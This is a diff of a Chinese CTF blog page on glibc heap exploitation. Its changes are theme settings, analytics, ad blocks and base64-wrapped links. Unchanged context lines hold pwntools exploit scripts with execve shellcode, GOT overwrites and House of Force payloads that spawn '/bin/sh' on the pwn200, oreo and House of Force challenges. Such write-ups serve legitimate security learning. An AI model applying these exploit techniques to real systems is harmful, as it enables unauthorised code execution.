@@ -20,7 +20,7 @@
 <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.4/css/all.min.css" integrity="sha256-mUZM63G8m73Mcidfrv5E+Y61y7a12O5mW4ezU3bxqW4=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"brubbish.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"brubbish.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
 <meta name="description" content="不出意外的话我应该是把这个鸽掉了">
 <meta property="og:type" content="article">
 <meta property="og:title" content="ctfwiki堆漏洞整理">
@@ -81,6 +81,9 @@
 <script class="next-config" data-name="calendar" type="application/json">""</script>
 <title>ctfwiki堆漏洞整理 | Brubbish's</title>
   
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-153514659-2"></script>
+  <script class="next-config" data-name="google_analytics" type="application/json">{"tracking_id":"UA-153514659-2","only_pageview":false}</script>
+  <script src="/js/third-party/analytics/google-analytics.js"></script>
 
 
 
@@ -125,7 +128,7 @@
 <nav class="site-nav">
   <ul class="main-menu menu">
         <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li>
-        <li class="menu-item menu-item-读过的书"><a href="/books/" rel="section"><i class="fa fa-bookmark fa-fw"></i>读过的书</a></li>
+        <li class="menu-item menu-item-book"><a href="/books/" rel="section"><i class="fa fa-bookmark fa-fw"></i>book</a></li>
       <li class="menu-item menu-item-search">
         <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
         </a>
@@ -221,8 +224,9 @@
         </div>
       </div>
 
-<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
-     crossorigin="anonymous"></script>
+
+
+
 <!-- sidebar -->
 <ins class="adsbygoogle"
      style="display:block"
@@ -230,6 +234,18 @@
      data-ad-slot="5504766755"
      data-ad-format="auto"
      data-full-width-responsive="true"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
+     crossorigin="anonymous"></script>
+<ins class="adsbygoogle"
+     style="display:block; text-align:center;"
+     data-ad-layout="in-article"
+     data-ad-format="fluid"
+     data-ad-client="ca-pub-9943095847270020"
+     data-ad-slot="6634125020"></ins>
 <script>
      (adsbygoogle = window.adsbygoogle || []).push({});
 </script>
@@ -460,7 +476,7 @@ checkout函数如下：<br>
 <h3 id="非HOS">非HOS</h3>
 <p>把dest的值覆盖为free_got，；此时如果buf中为&quot;shellocde_addr&quot;+“\x00”*n，free的got表就指向shellcode，执行free时就相当于执行shellocde</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">shellcode=<span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))	</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"><span class="comment"># leak rbp &amp; shellcode_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;~\n&quot;</span>)</span><br><span class="line">payload = p64(shellcode_addr) + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(p64(shellcode_addr))) + p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-<h2 id="2014-hack-lu-oreo">2014 <a target="_blank" rel="noopener" href="http://hack.lu">hack.lu</a> oreo</h2>
+<h2 id="2014-hack-lu-oreo">2014 <span class="exturl" data-url="aHR0cDovL2hhY2subHU=">hack.lu<i class="fa fa-external-link-alt"></i></span> oreo</h2>
 <p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101129.png" alt="20210331101129"></p>
 <p>拖到ida里分析一波，main函数做了个初始化<br>
 <img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101246.png" alt="20210331101246"><br>
@@ -504,8 +520,8 @@ sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,payload)</span><br><span class="line">add_message(p32(sys)+<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># system(p32(system_addr);&quot;/bin/sh&quot;) = system(p32(system_addr));system(&quot;/bin/sh&quot;);</span></span><br></pre></td></tr></table></figure>
 <p>另：写一半把ida关了，且没保存数据orz，所以最后就写的比较快且没有截图了…</p>
 <p>参考：<br>
-<a target="_blank" rel="noopener" href="https://bbs.pediy.com/thread-247214.htm">https://bbs.pediy.com/thread-247214.htm</a><br>
-<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo</a></p>
+<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDcyMTQuaHRt">https://bbs.pediy.com/thread-247214.htm<i class="fa fa-external-link-alt"></i></span><br>
+<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvZmFzdGJpbl9hdHRhY2svIzIwMTQtaGFja2x1LW9yZW8=">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo<i class="fa fa-external-link-alt"></i></span></p>
 <h1>House of Force</h1>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">利用条件:</span><br><span class="line">- 能够以溢出等方式修改top chunk的size域</span><br><span class="line">- 自由控制堆分配的大小</span><br><span class="line"></span><br><span class="line">步骤:</span><br><span class="line">1. malloc(100)//随便分配一个chunk</span><br><span class="line">2. 使用溢出修改top chunk的size为一个大数//不会去调用mmap</span><br><span class="line">3. malloc(size)//size=目标地址减去 top chunk 地址，再减去 chunk 头的大小</span><br><span class="line">4. p = malloc(100); p == 目标地址</span><br><span class="line"></span><br><span class="line">摘自0x2l师傅的文章</span><br></pre></td></tr></table></figure>
 <h2 id="题">题</h2>
@@ -521,8 +537,8 @@ sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#泄露puts</span></span><br><span class="line"><span class="comment">## 前面与↑相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line">target_addr = content_ptr </span><br><span class="line">malloc_size = target_addr - topchunk_addr -<span class="number">0x10</span></span><br><span class="line">add(malloc_size, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># topchunk -&gt; content_ptr - 0x8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下部分用gdb查看内存中的内容比较容易搞懂</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x804b130</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload )</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))    <span class="comment">#修改free_got为puts_plt</span></span><br><span class="line">delete(<span class="number">2</span>)   <span class="comment">#输出puts_addr</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_addr = puts_addr - <span class="number">0x24f00</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 <p>做这题的时候感觉很奇怪。首先是第一种泄露atoi的方法，似乎只在给定libc的时候有效，把获得的atoi的地址放进libc database里查的时候查不到对应的libc…而第二种泄露puts的方法就可以正常getshell</p>
 <p>参考：<br>
-<a target="_blank" rel="noopener" href="https://my.oschina.net/u/4347688/blog/3561765">一</a><br>
-<a target="_blank" rel="noopener" href="https://blog.csdn.net/seaaseesa/article/details/105588058">二</a></p>
+<span class="exturl" data-url="aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91LzQzNDc2ODgvYmxvZy8zNTYxNzY1">一<i class="fa fa-external-link-alt"></i></span><br>
+<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTA1NTg4MDU4">二<i class="fa fa-external-link-alt"></i></span></p>
 
     </div>
 
@@ -591,7 +607,7 @@ sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
       </span>
     </span>
 </div>
-  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
+  <div class="powered-by">由 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span> 强力驱动
   </div>
 
 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9943095847270020"
